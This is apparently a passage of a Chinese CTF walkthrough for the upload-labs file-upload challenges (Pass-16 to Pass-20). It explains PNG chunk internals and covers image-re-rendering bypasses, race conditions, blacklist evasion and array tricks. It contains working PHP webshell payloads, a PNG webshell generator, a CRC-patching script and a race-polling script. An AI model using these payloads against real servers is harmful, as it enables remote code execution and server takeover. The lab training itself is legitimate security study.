![insert](https://s1.bpoj.top/81a38dfece116525da00692811a926a0.png)

成功上传并 get shell。

### jpg：

阅读[其他文章](https://sxksec.cn/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/#%E5%9B%9B%E3%80%81%E7%BB%95%E8%BF%87%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E5%B9%B6%E5%8C%85%E5%90%ABjpg%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%EF%BC%88%E6%9C%AA%E6%88%90%E5%8A%9F%EF%BC%89) 可知，jpg 图片易损，经过二次渲染后不变的数据块很少。难以制作图片木马。

### png：

首先分析 PNG 图片结构。

#### 文件头

PNG 文件标志，固定为 `89 50 4E 47 0D 0A 1A 0A`。

#### 数据块

PNG 定义了两种类型的数据块。一种称为关键数据块，每个 PNG 文件都必须包含它们；另一种叫做辅助数据块，这是可选的数据块。

1. 关键数据块（critical chunk）

- IHDR（文件头数据块）：包含图像基本信息，作为第一个数据块出现并只出现一次。
- PLTE（调色板数据块）：可选，定义索引颜色图像中的颜色，存放在图像数据块（IDAT）之前。
- IDAT（图像数据块）：存储实际的图像数据，PNG 数据包允许包含多个连续的图像数据块。
- IEND（图像结束数据）：标识图像数据结束。标识 PNG 文件结束，无数据字段，CRC 固定为 `AE 42 60 82`。

2. 辅助数据块（ancillary chunks）

| 数据块符号 | 数据块名称             | 多数据块 | 可选否 | 位置限制               |
| :--------- | :--------------------- | :------- | :----- | :--------------------- |
| cHRM       | 基色和白色点数据块     | 否       | 是     | 在 PLTE 和 IDAT 之前   |
| gAMA       | 图像γ数据块            | 否       | 是     | 在 PLTE 和 IDAT 之前   |
| sBIT       | 样本有效位数据块       | 否       | 是     | 在 PLTE 和 IDAT 之前   |
| bKGD       | 背景颜色数据块         | 否       | 是     | 在 PLTE 之后 IDAT 之前 |
| hIST       | 图像直方图数据块       | 否       | 是     | 在 PLTE 之后 IDAT 之前 |
| tRNS       | 图像透明数据块         | 否       | 是     | 在 PLTE 之后 IDAT 之前 |
| oFFs       | （专用公共数据块）     | 否       | 是     | 在 IDAT 之前           |
| pHYs       | 物理像素尺寸数据块     | 否       | 是     | 在 IDAT 之前           |
| sCAL       | （专用公共数据块）     | 否       | 是     | 在 IDAT 之前           |
| tIME       | 图像最后修改时间数据块 | 否       | 是     | 无限制                 |
| tEXt       | 文本信息数据块         | 是       | 是     | 无限制                 |
| zTXt       | 压缩文本数据块         | 是       | 是     | 无限制                 |
| iTXt       | 国际文本数据块         | 是       | 是     | 无限制                 |
| fRAc       | （专用公共数据块）     | 是       | 是     | 无限制                 |
| gIFg       | （专用公共数据块）     | 是       | 是     | 无限制                 |
| gIFt       | （专用公共数据块）     | 是       | 是     | 无限制                 |
| gIFx       | （专用公共数据块）     | 是       | 是     | 无限制                 |

#### 数据块结构

每个数据块包含以下字段：

| 名称                            | 字节数   | 说明                                                 |
| :------------------------------ | :------- | :--------------------------------------------------- |
| Length（长度）                  | 4 字节   | 指定数据块中数据域的长度，其长度不超过（231－1）字节 |
| Chunk Type Code（数据块类型码） | 4 字节   | 数据块类型码由 ASCII 字母（A - Z 和 a - z）组成      |
| Chunk Data（数据块数据）        | 可变长度 | 存储按照 Chunk Type Code 指定的数据                  |
| CRC（循环冗余检测）             | 4 字节   | 存储用来检测是否有错误的循环冗余码                   |

CRC（Cyclic Redundancy Check）域中的值是对 Chunk Type Code 域和 Chunk Data 域中的数据进行计算得到的。

**示例结构：**

- 文件头 (8 字节)
- IHDR 块 (25 字节)
- PLTE 块 (可选)
- IDAT 块 (一个或多个)
- IEND 块 (12 字节)

#### 分析数据块

#### IHDR

> 文件头数据块 IHDR（Header Chunk）：它包含有 PNG 文件中存储的图像数据的基本信息，由 13 字节组成，并要作为第一个数据块出现在 PNG 数据流中，而且一个 PNG 数据流中只能有一个文件头数据块。

我们一般关注前 8 字节的内容：

| 域的名称 | 字节数  | 说明                   |
| :------- | :------ | :--------------------- |
| Width    | 4 bytes | 图像宽度，以像素为单位 |
| Height   | 4 bytes | 图像高度，以像素为单位 |

我们经常会去更改一张图片的高度或者宽度使得一张图片显示不完整从而达到隐藏信息的目的。

#### PLTE

调色板数据块 PLTE：它包含有与索引彩色图像（indexed-color image）相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块（image data chunk）之前。真彩色的 PNG 数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。

PLTE 可以包含 $1\sim 256$ 个调色板信息，每一个调色板信息由 3 个字节组成：

| 颜色  |  字节  | 意义                 |
| ----- | :----: | -------------------- |
| Red   | 1 byte | 0 = 黑色, 255 = 红   |
| Green | 1 byte | 0 = 黑色, 255 = 绿色 |
| Blue  | 1 byte | 0 = 黑色, 255 = 蓝色 |

因此，调色板的长度应该是3的倍数。

对于索引图像，调色板信息是必须的，调色板的颜色索引从 0 开始编号，然后是 1,2...，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为 4 的时候，调色板中的颜色数不可以超过 2^4=16）。否则，这将导致 PNG 图像不合法。

PLTE 数据块结构：

| 名称            | 字节数   | 说明                                                 |
| :-------------- | :------- | :--------------------------------------------------- |
| Length          | 4 字节   | 指定数据块中数据域的长度，其长度不超过（231－1）字节 |
| Chunk Type Code | 4 字节   | 标识块类型，固定为 PLTE                              |
| Chunk Data      | 可变长度 | 存储调色板数据，每个颜色由 3 字节（RGB）表示         |
| CRC             | 4 字节   | 校验值，用于验证数据块的完整性                       |

#### IDAT

图像数据块 IDAT（image data chunk）：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。

IDAT 数据块结构：

| 名称            | 字节数   | 说明                                                                                                                |
| :-------------- | :------- | :------------------------------------------------------------------------------------------------------------------ |
| Length          | 4 字节   | 指定 Chunk Data 字段的长度                                                                                          |
| Chunk Type Code | 4 字节   | 标识块类型，固定为 IDAT                                                                                             |
| Chunk Data      | 可变长度 | 存储 zlib 压缩后的图像数据，包括：<br> 1.zlib 压缩头（1 字节） <br> 2.压缩后的图像数据 <br> 3.zlib 校验值（4 字节） |
| CRC             | 4 字节   | 校验值，用于验证数据块的完整性                                                                                      |

#### IEND

图像结束数据 IEND（image trailer chunk）：它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。

```
00 00 00 00 49 45 4E 44 AE 42 60 82
```

IEND 数据块的长度总是 `00 00 00 00`，数据标识总是 IEND `49 45 4E 44`，因此，CRC 码也总是 `AE 42 60 82`。


#### 在 PNG 图片中写入 php 代码的方式

##### 写入 PLTE 数据块

php 底层在对 PLTE 数据块验证的时候，主要进行了 CRC 校验。所以可以在 chunk data 域插入 php 代码，然后重新计算相应的 CRC 值并修改即可。

这种方式只针对索引彩色图像的 png 图片才有效，在选取 png 图片时可根据 IHDR 数据块的 color type 辨别 03 为索引彩色图像。

例如：

![03png](https://s1.bpoj.top/84306b56a5ba81b69f1e826c4550db10.png)

我们在 PLTE 数据块中写入 php 代码：

![before](https://s1.bpoj.top/941bc95b755e857f4cccf3394c1ff50c.png)

![after](https://s1.bpoj.top/4aacc866aa90769b8b9e8b4d1dd6e14e.png)

然后重新计算 CRC 的值：`CRC.py`

```py
import binascii
import re
from pathlib import Path
 
png_path = Path(__file__).resolve().parent / "03png.png"
a = png_path.read_bytes()
hexstr = a.hex() # 转十六进制字符串
 
''' PLTE crc '''
# "504c5445" 是 "PLTE" 的十六进制形式
# "49444154" 是 "IDAT" 的十六进制形式
# "74524e53" 是 "tRNS" 的十六进制形式
# 如果后面有 tRNS 数据块就从 tRNS 的标识符截断
# data =  '504c5445'+ re.findall('504c5445(.*?)74524e53',hexstr)[0] # 取出从 PLTE 类型码开始到下一个 tRNS 类型码之前的数据
data =  '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] # 取出从 PLTE 类型码开始到下一个 IDAT 类型码之前的数据
# data[:-16] 截掉最后 8 字节。分别是旧 CRC（4 字节）和下一个 IDAT 块的 length（4 字节）
crc = binascii.crc32(binascii.unhexlify(data[:-16])) & 0xffffffff # 计算 CRC 值并保证返回的是无符号 32 位结果
print(hex(crc))
```

可以得到 PLTE 数据块的 CRC 值，例如：`d184739b`。

然后修改 CRC 值，这里可以先搜索 `tRNS`，PLTE 数据块的 CRC 值就在 `tRNS` 的前面。

如图，这里就是 CRC 校验码：

![crc](https://s1.bpoj.top/00d8df36ed2ba20a09fdf5a2a1cd26ea.png)

修改后：

![edit](https://s1.bpoj.top/7a55a3c0ca96d6c622b603d004682805.png)

保存上传，下载发现木马经过重新渲染后依然存在。

成功 getshell。

##### 写入 IDAT 数据块

用 php 生成一个图片马。

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

![gen](https://s1.bpoj.top/dde6184d58a8895a5a04e1adfd5bd17e.png)

其中包含木马 `<?=$_GET[0]($_POST[1]);?>`。

## Pass-17（条件竞争绕过）

上传一个 `webshell` 到服务器。

提示说需要代码审计，那我们直接来看代码。

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

移动临时文件到目标路径，然后检测后缀是否合法，不合法就删除文件。

我们上传的文件会短暂存储在目录下，存在条件竞争的隐患，我们要在服务器执行 `unlink` 删除之前访问 php 脚本，并在服务端创建一个 `webshell`。

创建一个木马：

```php
<?php fputs(fopen('webshell.php','w'),'<?php @eval($_POST[cmd]);?>');?>
```

表示将木马写入 `webshell.php` 文件中。

用多线程并发上传脚本，在文件被删除之前，多线程并发访问这个脚本，总有一次会触发执行脚本创建文件。

我们用 burp suite 来并发上传，首先拦截一下上传请求，然后 send to intruder：

![](https://s1.bpoj.top/fd1ff123e4788b92848ed069edc21ad6.png)

在 Intruder 里我们选择 Sniper attack 模式，payload 选择 Null payloads：

![](https://s1.bpoj.top/285e96f426a6a39a995bc80b5a1f5495.png)

新建一个资源池，加上并发，因为 buuoj 有请求频率限制，我们写个随机请求间隔：

![](https://s1.bpoj.top/5279dbfb1cd55ff27c52491e40f659c2.png)

开始攻击：

![](https://s1.bpoj.top/07923bd3aec2e5a7bc8df43e213ec9d7.png)

同时，我们写一个 py 脚本，用来请求上传的脚本：

```py
import requests
url = "http://1722609e-d3e2-499b-9551-6d8e32018ca5.node5.buuoj.cn:81/upload/shell.php"
while True:
    html = requests.get(url)
    if html.status_code == 200:
        print("200")
        break
    else:
        print(html.status_code)
```

同时执行，看到 py 脚本输出 `200` 代表木马脚本已经创建。蚁剑 getshell。

## Pass-18（Apache 解析漏洞-条件竞争绕过）

还是一样提示我们进行代码审计：

```php
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```

`index.php` 是文件上传的入口，用户提交表单后，首先引入 `myupload.php` 里定义的 `MyUpload` 类，然后调用里面的 `upload` 进行上传。

首先 apache 无法解析 `.7z` 文件，会把 `webshell.php.7z` 解析成 `webshell.php`。上传的文件会先执行 `move` 操作再重命名，我们可以进行条件竞争，在生成 php 文件的一瞬间进行访问。

和上一关类似，抓包上传操作，然后并发进行上传，同时访问 `/upload/shell.php`，执行后会在同目录创建木马文件，用蚁剑 getshell 即可。

## Pass-19（黑名单绕过）

提示：本 pass 的取文件名通过 `$_POST` 来获取。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

本关会从表单中获取用户指定的文件名，然后检查后缀是否在黑名单内。

我们可以用前面的方法绕过后缀黑名单检测。例如大小写绕过、空格绕过、末尾点号绕过等等。

## Pass-20（数组绕过）

提示审计代码：

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

这一关检查了 MIME 类型和文件后缀。代码里有个 `!is_array($file)` 的检查，提示我们 `save_name` 参数可以传数组。

代码中 `$file_name = reset($file) . '.' . $file[count($file) - 1];` 里的 `reset` 会返回数组中第一个元素，如果我们上传 `save_name[0] = webshell.php, save_name[2] = png`，这样 `$file[count($file) - 1]` 为空，最后文件名为 `webshell.php.`，达到目的。

## 参考文章

- https://sxksec.cn/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/
- https://ctf-wiki.org/